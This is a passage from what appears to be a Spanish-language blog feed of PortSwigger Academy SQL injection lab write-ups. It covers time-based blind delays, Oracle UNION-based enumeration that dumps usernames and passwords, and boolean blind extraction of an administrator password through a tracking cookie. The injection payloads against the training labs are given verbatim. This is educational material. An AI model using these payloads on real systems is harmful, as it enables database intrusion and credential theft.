			flex-grow: 140; 
			flex-basis: 338px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater.png&#34; data-size=&#34;1546x1097&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater.png&#34;
			width=&#34;1546&#34;
			height=&#34;1097&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater_hu6e396335c4c9a3008f18d7243f6688e9_158621_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater_hu6e396335c4c9a3008f18d7243f6688e9_158621_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion enviada con repeater para exfiltrar la contrasena&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion enviada con repeater para exfiltrar la contrasena&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora solo queda iniciar sesion con la contrasena de administrator qu es &lt;code&gt;54m0mxu0yem302cyqm60&lt;/code&gt;.Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 196; 
			flex-basis: 471px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto.png&#34; data-size=&#34;1780x906&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto.png&#34;
			width=&#34;1780&#34;
			height=&#34;906&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto_hu07931e63497d5aea473f97c5614a0e07_96835_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto_hu07931e63497d5aea473f97c5614a0e07_96835_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 13</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/</link>
        <pubDate>Mon, 08 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 13" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-time-delays&#34;&gt;Lab: Blind SQL injection with time delays&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de sql injection pero basandose en tiempo, en este caso la inyeccion solo es para poder inyectar un codigo que genere un delay hacia el backend de la base de datos, lo cual la respuesta tardara segun el tiempo que nosotros le inyectemos. En base a ese tiempo despues podriamos generar una consulta if para poder devolvernos si la consulta hecha es true o false.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Se pide que solo se inyecte una consulta sql que cause un delay de 10 segundos asi que buscaremos la vulnerabilidad en la aplicacion y para generar un delay con cada backend seria un ejemplo:&lt;/p&gt;
&lt;p&gt;Oracle&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dbms_pipe.receive_message((&#39;a&#39;),10)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Microsoft&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WAITFOR DELAY &#39;0:0:10&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;PostgreSQL&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT pg_sleep(10)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;MySQL&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT sleep(10)&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;En este caso he conocido otra &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt; donde reune todos los payloads que se pueden inyectar para generar una vulnerabilidad sql. Al hacer tantas combinaciones, se pudo generar una o varias la cual permiten que se genere un delay en la aplicacion. Todo esto podemos verlo gracias a uno de los probados son:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1337&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1337&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lo primero a agregar es que se debe de activar la columna &lt;code&gt;response received&lt;/code&gt; para ver el tiempo que la respuesta a tardado en ser recibida, lo que nos indica que se inyecto una consult sql.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 489; 
			flex-basis: 1174px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/intruder.png&#34; data-size=&#34;974x199&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/intruder.png&#34;
			width=&#34;974&#34;
			height=&#34;199&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/intruder_hu84c9dcc0151ff24e5f16b96978ec8268_6923_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/intruder_hu84c9dcc0151ff24e5f16b96978ec8268_6923_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque de sql injection time based con intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque de sql injection time based con intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora la enviaremos por repeater con un sleep de 10 segundos y ver si tarda 10 segundos en responder y si vemos de lado derecho la peticion dura 10,486 millis en responder.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 220; 
			flex-basis: 528px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/repeater.png&#34; data-size=&#34;1336x607&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/repeater.png&#34;
			width=&#34;1336&#34;
			height=&#34;607&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/repeater_huf0e5ab5037a292e044b3df38cbe38ce9_118306_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/repeater_huf0e5ab5037a292e044b3df38cbe38ce9_118306_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Envio de peticion por repeater&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Envio de peticion por repeater&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 238; 
			flex-basis: 572px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/resuelto.png&#34; data-size=&#34;1772x743&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/resuelto.png&#34;
			width=&#34;1772&#34;
			height=&#34;743&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/resuelto_huec78dc9529bbfebd5c8e1f5867d71e8c_88264_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/resuelto_huec78dc9529bbfebd5c8e1f5867d71e8c_88264_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-time-delays&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Lista de Payloads SQL Injection Time Based&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 10</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/</link>
        <pubDate>Sun, 07 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 10" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-listing-the-database-contents-on-oracle&#34;&gt;Lab: SQL injection attack, listing the database contents on Oracle&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos en una base de datos oracle que es muy distinto a como se hace en los otros gestores&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un &lt;code&gt;-&lt;/code&gt; para inyectar correctamente la consulta y contrario por medio de &lt;code&gt;repeater en burpsuite&lt;/code&gt; si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;payloads&#34;&gt;Payloads&lt;/h2&gt;
&lt;h3 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from dual-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-tablas&#34;&gt;Recuperar tablas&lt;/h3&gt;
&lt;p&gt;Ahora recuperar las tablas, en este caso vamos a buscar una tabla que contenga los usuarios, en este caso es la tabla &lt;code&gt;USERS_TMNLZU&lt;/code&gt; y es la que se lista.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select table_name,null from all_tables-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 117; 
			flex-basis: 280px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas.png&#34; data-size=&#34;1720x1470&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas.png&#34;
			width=&#34;1720&#34;
			height=&#34;1470&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas_hubb502ce8c335fdb496ff495a359e13a6_180676_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas_hubb502ce8c335fdb496ff495a359e13a6_180676_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Tablas&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Tablas&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h3&gt;
&lt;p&gt;Para detectar el nombre de las columnas en las tablas se inyecta la siguiente consulta, indicando la tabla de la que se quiere extraer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select column_name,null from all_tab_columns where table_name = &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;USERS_TMNLZU&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 104; 
			flex-basis: 250px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34; data-size=&#34;1766x1692&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34;
			width=&#34;1766&#34;
			height=&#34;1692&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Columnas de tabla USERS_TMNLZU&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Columnas de tabla USERS_TMNLZU&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;extraer-datos&#34;&gt;Extraer datos&lt;/h3&gt;
&lt;p&gt;Ahora podremos recuperar los datos teniendo el nombre de las columnas y el nombre de las tablas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select USERNAME_KNMULR,PASSWORD_KQXSZA from USERS_TMNLZU-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 104; 
			flex-basis: 250px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34; data-size=&#34;1766x1692&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34;
			width=&#34;1766&#34;
			height=&#34;1692&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Datos extraidos de la tabla USERS_TMNLZU&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Datos extraidos de la tabla USERS_TMNLZU&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 202; 
			flex-basis: 485px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto.png&#34; data-size=&#34;1797x888&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto.png&#34;
			width=&#34;1797&#34;
			height=&#34;888&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto_hu255c4e95acf6dc1716e44febf60b0d46_100921_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto_hu255c4e95acf6dc1716e44febf60b0d46_100921_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 11</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/</link>
        <pubDate>Sun, 07 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 11" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-conditional-responses&#34;&gt;Lab: Blind SQL injection with conditional responses&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la contrasena del usuario &lt;code&gt;administrator&lt;/code&gt;, para eso se nos dan las columnas &lt;code&gt;username&lt;/code&gt; y &lt;code&gt;password&lt;/code&gt; de la tabla &lt;code&gt;users&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero es buscar donde es vulnerable a sql injection, en este caso nos dicen en el articulo que seguramente es la cookie de &lt;code&gt;TrackingId&lt;/code&gt; solo queda comprobarlo.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;detectar-si-es-vulnerable&#34;&gt;Detectar si es vulnerable&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;TrackingId=xxxxxxxxxxxxxxxx&#39; and &#39;1&#39;=&#39;1; //Muestra welcome back
TrackingId=xxxxxxxxxxxxxxxx&#39; and &#39;1&#39;=&#39;2; //No muestra welcome back
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 272; 
			flex-basis: 653px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/cookie.png&#34; data-size=&#34;1533x563&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/cookie.png&#34;
			width=&#34;1533&#34;
			height=&#34;563&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/cookie_hu160d6ae4632b30fd2dacbfe9b3d0c119_96300_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/cookie_hu160d6ae4632b30fd2dacbfe9b3d0c119_96300_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion enviada al servidor&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion enviada al servidor&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al inyectar la solicitud podemos darnos cuenta que el sistema valida la cookie dependiendo de la respuesta de mysql, si hacemos una comparacion que no es correcta, el sistema ya no imprime &lt;code&gt;welcome back&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&#34;verificar-tamano-de-la-contrasena-de-administrator&#34;&gt;Verificar tamano de la contrasena de administrator&lt;/h4&gt;
&lt;p&gt;Ahora toca construir una consulta para inyectar para poder extraer los datos de base de datos de &lt;code&gt;users&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;TrackingId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select length(password) from users where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)=1--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;La siguiente solicitud lo que hace es hacer un select del tamano de la contrasena del usuario &lt;code&gt;administrator&lt;/code&gt; y el valor numerico es el que ira cambiando, y hasta que el sistema devuelva la respuesta &lt;code&gt;welcome back&lt;/code&gt; es porque es lo correcto, todo basandose en que la respuesta sea true si imprimira ese resultado.&lt;/p&gt;
&lt;p&gt;En este caso construimos la siguiente captura para saber el valor del tamano de la contrasena para posteriormente ir cambiando el valor de la consulta y hacer un ataque con intruder en burpsuite para evitar hacerlo a mano y durar mucho en el proceso. Para eso crafteamos la siguiente solicitud, y agregamos como payload el valor numerico para ir cambiandolo y averiguar el tamano de la contrasena administrador.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 218; 
			flex-basis: 524px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderpayload.png&#34; data-size=&#34;1129x517&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderpayload.png&#34;
			width=&#34;1129&#34;
			height=&#34;517&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderpayload_hue30736de10eb95c71aec17cad9a24a21_67662_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderpayload_hue30736de10eb95c71aec17cad9a24a21_67662_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud que se enviara&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud que se enviara&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
